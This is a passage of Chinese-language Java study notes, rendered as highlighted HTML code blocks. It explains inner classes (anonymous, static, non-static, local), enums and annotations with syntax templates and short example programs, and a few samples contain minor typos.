class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//用父类与匿名内部类的对象构成多态引用</span></span><br><span class="line">        Father f = <span class="keyword">new</span> Father()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"用匿名内部类继承了Father这个抽象类，重写了test抽象方法"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        f.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）示例代码：实现式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Flyable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//用父接口与匿名内部类的对象构成了多态引用</span></span><br><span class="line">        Flyable f = <span class="keyword">new</span> Flyable()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"用匿名内部类实现了Flyable这个接口，重写了抽象方法"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        f.fly();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）示例代码：用匿名内部类的匿名对象直接调用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Object()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"用匿名内部类的匿名对象直接调用方法"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;.test();</span><br></pre></td></tr></table></figure><p>（4）示例代码：用匿名内部类的匿名对象直接作为实参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Student[] all = <span class="keyword">new</span> Student[<span class="number">3</span>];</span><br><span class="line">all[<span class="number">0</span>] = <span class="keyword">new</span> Student(<span class="string">"张三"</span>,<span class="number">23</span>);</span><br><span class="line">all[<span class="number">1</span>] = <span class="keyword">new</span> Student(<span class="string">"李四"</span>,<span class="number">22</span>);</span><br><span class="line">all[<span class="number">2</span>] = <span class="keyword">new</span> Student(<span class="string">"王五"</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//用匿名内部类的匿名对象直接作为实参</span></span><br><span class="line"><span class="comment">//这个匿名内部类实现了Comparator接口</span></span><br><span class="line"><span class="comment">//这个匿名内部类的对象，是定制比较器的对象</span></span><br><span class="line">Arrays.sort(all, <span class="keyword">new</span> Comparator()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Obeject o1, Object o2)</span></span>&#123;</span><br><span class="line">        Student s1 = (Student)o1;</span><br><span class="line">        Student s2 = (Student)o2;</span><br><span class="line">        <span class="keyword">return</span> s1.getAge() - s2.getAge();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="7-10-2-静态内部类"><a href="#7-10-2-静态内部类" class="headerlink" title="7.10.2  静态内部类"></a>7.10.2  静态内部类</h3><p>1、语法格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 外部类名  【<span class="keyword">extends</span> 外部类的父类】 【<span class="keyword">implements</span> 外部类的父接口们】</span>&#123;</span><br><span class="line">【其他修饰符】 <span class="keyword">static</span> <span class="class"><span class="keyword">class</span>  静态内部类 【<span class="keyword">extends</span> 静态内部类自己的父类】 【<span class="keyword">implements</span> 静态内部类的父接口们】</span>&#123;</span><br><span class="line">        静态内部类的成员列表;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">外部类的其他成员列表;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、 使用注意事项</p><p>（1）包含成员是否有要求：</p><p>​        可以包含类的所有成员</p><p>（2）修饰符要求：</p><ul><li>​        权限修饰符：4种</li><li>​        其他修饰符：abstract、final</li></ul><p>（3）使用外部类的成员上是否有要求</p><ul><li>​        只能使用外部类的静态成员</li></ul><p>（4）在外部类中使用静态内部类是否有要求</p><ul><li>​        正常使用</li></ul><p>（5）在外部类的外面使用静态内部类是否有要求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）如果使用的是静态内部类的静态成员</span><br><span class="line">外部类名.静态内部类名.静态成员</span><br><span class="line">（<span class="number">2</span>）如果使用的是静态内部类的非静态成员</span><br><span class="line">①先创建静态内部类的对象</span><br><span class="line">外部类名.静态内部类名 对象名 = <span class="keyword">new</span> 外部类名.静态内部类名(【实参列表】);</span><br><span class="line">②通过对象调用非静态成员</span><br><span class="line">对象名.xxx</span><br></pre></td></tr></table></figure><p>（6）字节码文件形式：外部类名$静态内部类名.class</p><p>3、示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            System.out.println(i);<span class="comment">//可以</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            System.out.println(i);<span class="comment">//可以</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">outMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Inner in = <span class="keyword">new</span> Inner();</span><br><span class="line">        in.method();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">outTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Inner in = <span class="keyword">new</span> Inner();</span><br><span class="line">        in.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Outer.Inner.test();</span><br><span class="line">        </span><br><span class="line">        Outer.Inner in = <span class="keyword">new</span> Outer.Inner();</span><br><span class="line">        in.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-10-3-非静态内部类"><a href="#7-10-3-非静态内部类" class="headerlink" title="7.10.3  非静态内部类"></a>7.10.3  非静态内部类</h3><p>1、语法格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 外部类名  【<span class="keyword">extends</span> 外部类的父类】 【<span class="keyword">implements</span> 外部类的父接口们】</span>&#123;</span><br><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span>  非静态内部类 【<span class="keyword">extends</span> 非静态内部类自己的父类】 【<span class="keyword">implements</span> 非静态内部类的父接口们】</span>&#123;</span><br><span class="line">        非静态内部类的成员列表;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">外部类的其他成员列表;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、 使用注意事项</p><p>（1）包含成员是否有要求：</p><p>​    不允许出现静态的成员</p><p>（2）修饰符要求</p><p>​    权限修饰符：4种</p><p>​    其他修饰符：abstract，final</p><p>（3）使用外部类的成员上是否有要求</p><p>​    都可以使用</p><p>（4）在外部类中使用非静态内部类是否有要求</p><p>​    在外部类的静态成员中不能使用非静态内部类</p><p>（5）在外部类的外面使用非静态内部类是否有要求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用非静态内部类的非静态成员</span></span><br><span class="line"><span class="comment">//(1)创建外部类的对象</span></span><br><span class="line">外部类名  对象名<span class="number">1</span> = <span class="keyword">new</span>  外部类名(【实参列表】);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)通过外部类的对象去创建或获取非静态内部类的对象</span></span><br><span class="line"><span class="comment">//创建</span></span><br><span class="line">外部类名.非静态内部类名  对象名<span class="number">2</span> = 对象名<span class="number">1</span>.new 非静态内部类名(【实参列表】);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取</span></span><br><span class="line">外部类名.非静态内部类名  对象名<span class="number">2</span> = 对象名<span class="number">1</span>.get非静态内部类对象的方法(【实参列表】);</span><br><span class="line"></span><br><span class="line"><span class="comment">//（3）通过非静态内部类调用它的非静态成员</span></span><br><span class="line">对象名<span class="number">2</span>.xxx</span><br></pre></td></tr></table></figure><p>（6）字节码文件形式：外部类名$非静态内部类名.class</p><p>3、示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> j = <span class="number">20</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            System.out.println(i);<span class="comment">//可以</span></span><br><span class="line">            System.out.println(j);<span class="comment">//可以</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">outMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Inner in = <span class="keyword">new</span> Inner();</span><br><span class="line">        in.method();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">outTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="comment">// Inner in = new Inner();//不可以</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Inner <span class="title">getInner</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Inner();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Outer out = <span class="keyword">new</span> Outer();</span><br><span class="line">        </span><br><span class="line">        Outer.Inner in1 = out.new Inner();     <span class="comment">//创建   </span></span><br><span class="line">        in1.method();</span><br><span class="line">        </span><br><span class="line">        Outer.Inner in2 = out.getInner();<span class="comment">//获取</span></span><br><span class="line">        in2.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-10-4-局部内部类"><a href="#7-10-4-局部内部类" class="headerlink" title="7.10.4  局部内部类"></a>7.10.4  局部内部类</h3><p>1、语法格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 外部类名  【<span class="keyword">extends</span> 外部类的父类】 【<span class="keyword">implements</span> 外部类的父接口们】</span>&#123;</span><br><span class="line">【修饰符】 返回值类型  方法名(【形参列表】)&#123;</span><br><span class="line">        【修饰符】 <span class="class"><span class="keyword">class</span>  局部内部类 【<span class="keyword">extends</span> 局部内部类自己的父类】 【<span class="keyword">implements</span> 局部内部类的父接口们】</span>&#123;</span><br><span class="line">        局部内部类的成员列表;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">外部类的其他成员列表;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、 使用注意事项</p><p>（1）包含成员是否有要求</p><p>​    不允许出现静态的成员</p><p>（2）修饰符要求</p><p>​    权限修饰符：不能</p><p>​    其他修饰符：abstract、final</p><p>（3）使用外部类的成员等上是否有要求</p><p>​    ①使用外部类的静态成员：随便用</p><p>​    ②使用外部类的非静态成员：能不能用要看所在的方法是否是静态的</p><p>​    ③使用所在方法的局部变量：必须 final修饰的</p><p>（4）在外部类中使用局部内部类是否有要求</p><p>​    有作用域</p><p>（5）在外部类的外面使用局部内部类是否有要求</p><p>​    没法使用</p><p>（6）字节码文件形式：外部类名$编号局部内部类名.class</p><p>3、示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> j = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">outMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">                System.out.println(i);<span class="comment">//可以</span></span><br><span class="line">                System.out.println(j);<span class="comment">//可以</span></span><br><span class="line">            &#125;</span><br><span class="line">   &#125;</span><br><span class="line">        Inner in = <span class="keyword">new</span> Inner();</span><br><span class="line">        in.method();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">outTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> k = <span class="number">30</span>;</span><br><span class="line">       <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">                System.out.println(i);<span class="comment">//可以</span></span><br><span class="line">                System.out.println(j);<span class="comment">//不可以</span></span><br><span class="line">                System.out.println(k);<span class="comment">//可以</span></span><br><span class="line">            &#125;</span><br><span class="line">   &#125;</span><br><span class="line">        Inner in = <span class="keyword">new</span> Inner();</span><br><span class="line">        in.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第八章-枚举与注解"><a href="#第八章-枚举与注解" class="headerlink" title="第八章  枚举与注解"></a>第八章  枚举与注解</h1><h2 id="8-1-枚举"><a href="#8-1-枚举" class="headerlink" title="8.1 枚举"></a>8.1 枚举</h2><p>1、枚举（JDK1.5引入的）</p><p>枚举类型的对象是有限、固定的几个常量对象。</p><p>2、语法格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//形式一：枚举类型中只有常量对象列表</span></span><br><span class="line">【修饰符】 <span class="keyword">enum</span> 枚举类型名&#123;</span><br><span class="line">    常量对象列表</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//形式二：枚举类型中只有常量对象列表</span></span><br><span class="line">【修饰符】 <span class="keyword">enum</span> 枚举类型名&#123;</span><br><span class="line">    常量对象列表;</span><br><span class="line">    </span><br><span class="line">    其他成员列表；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：常量对象列表必须在枚举类型的首行</p><p>回忆：首行</p><p>（1）super()或super(实参列表)：必须在子类构造器的首行</p><p>（2）this()或this(实参列表)：必须在本类构造器的首行</p><p>（3）package 包; 声明包的语句必须在源文件.java的代码首行</p><p>（4）枚举常量对象列表必须在枚举类型的首行</p><p>3、在其他类中如何获取枚举的常量对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取一个常量对象</span></span><br><span class="line">枚举类型名.常量对象名</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取一个常量对象</span></span><br><span class="line">枚举类型名.valueOf(<span class="string">"常量对象名"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">//获取所有常量对象</span></span><br><span class="line">枚举类型名[] all = 枚举类型名.values();</span><br></pre></td></tr></table></figure><p>4、枚举类型的特点</p><p>（1）枚举类型有一个公共的基本的父类，是java.lang.Enum类型，所以不能再继承别的类型</p><p>（2）枚举类型的构造器必须是私有的</p><p>（3）枚举类型可以实现接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">MyRunnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">enum</span> Gender implements MyRunnable&#123;</span><br><span class="line">    NAN,NV;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//或</span></span><br><span class="line"><span class="keyword">enum</span> Gender implements MyRunnable&#123;</span><br><span class="line">    NAN&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,NV&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">   &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、父类java.lang.Enum类型</p><p>（1）构造器</p><p>protected Enum(String name, int ordinal)：由编译器自动调用</p><p>（2）String name()：常量对象名</p><p>（3）int ordinal()：返回常量对象的序号，第一个的序号是0</p><p>（4）String toString()：返回常量对象名，如果子类想重写，需要手动</p><p>（5）int compareTo(Object obj)：按照常量对象的顺序比较</p><h2 id="8-2-注解"><a href="#8-2-注解" class="headerlink" title="8.2 注解"></a>8.2 注解</h2><p>1、注解</p><p>它是代码级别的注释</p><p>2、标记符号：@</p><p>3、系统预定义的三个最基本的注解：</p><p>（1）@Override：表示某个方法是重写的方法</p><p>它只能用在方法上面，会让编译器对这个方法进行格式检查，是否满足重写的要求</p><p>（2）@SuppressWarnings(xx)：抑制警告</p><p>（3）@Deprecated：表示xx已过时</p><p>4、和文档注释相关的注解</p><p>（1）文档注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">文档注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>（2）常见的文档注释</p><p>@author：作者</p><p>@since：从xx版本加入的</p><p>@see：另请参考</p><p>@param：形参</p><p>@return：返回值</p><p>@throws或@exception：异常</p><p>5、JUnit相关的几个注解</p><p>（1）@Test：表示它是一个单元测试方法</p><p>这个方法需要是：public void xxx(){}</p><p>（2）@Before：表示在每一个单元测试方法之前执行</p><p>这个方法需要是：public void xxx(){}</p><p>（3）@After：表示在每一个单元测试方法之后执行</p><p>这个方法需要是：public void xxx(){}</p><p>（4）@BeforeClass：表示在类初始化阶段执行，而且只执行一次</p><p>这个方法需要是：public static void xxx(){}</p><p>（3）@AfterClass：表示在类的“卸载”阶段执行，而且只执行一次</p><p>这个方法需要是：public static void xxx(){}</p><p>6、元注解</p><p>（1）@Target(xx)：用它标记的注解能够用在xx位置</p><p>(xx)：由ElementType枚举类型的10个常量对象指定，例如：TYPE，METHOD，FIELD等</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target</span>(ElementType.TYPE)</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target</span>(&#123;ElementType.TYPE,ElementType.METHOD,ElementType.FIELD&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.annotation.ElementType.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Target</span>(&#123;TYPE,METHOD,FIELD&#125;)</span><br></pre></td></tr></table></figure><p>（2）@Retention（xx）：用它标记的注解可以滞留到xx阶段</p><p>(xx)：由RetentionPolicy枚举类型的3个常量对象指定，分别是：SOURCE，CLASS，RUNTIME</p><p>唯有RUNTIME阶段的注解才能被反射读取到</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br></pre></td></tr></table></figure><p>（3）@Documentd：用它标记的注解可以读取到API中</p><p>（4）@Inherited：用它标记的注解可以被子类继承</p><p>7、自定义注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@元注解</span><br><span class="line">【修饰符】 <span class="meta">@interface</span> 注解名&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@元注解</span><br><span class="line">【修饰符】 <span class="meta">@interface</span> 注解名&#123;</span><br><span class="line">    配置参数列表</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置参数的语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数据类型  配置参数名();</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">数据类型  配置参数名() <span class="keyword">default</span> 默认值;</span><br></pre></td></tr></table></figure><p>关于配置参数：</p><p>（1）配置参数的类型有要求：</p><p>八种基本数据类型、String、枚举、Class类型、注解、它们的数组。</p><p>（2）如果自定义注解声明了配置参数，那么在使用这个注解时必须为配置参数赋值，除非它有默认值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@自定义注解名(配置参数名<span class="number">1</span>=值，配置参数名<span class="number">2</span>=值。。。)</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果配置参数类型是数组，那么赋值时，可以用&#123;&#125;表示数组</span></span><br><span class="line">@自定义注解名(配置参数名<span class="number">1</span>=&#123;值&#125;，配置参数名<span 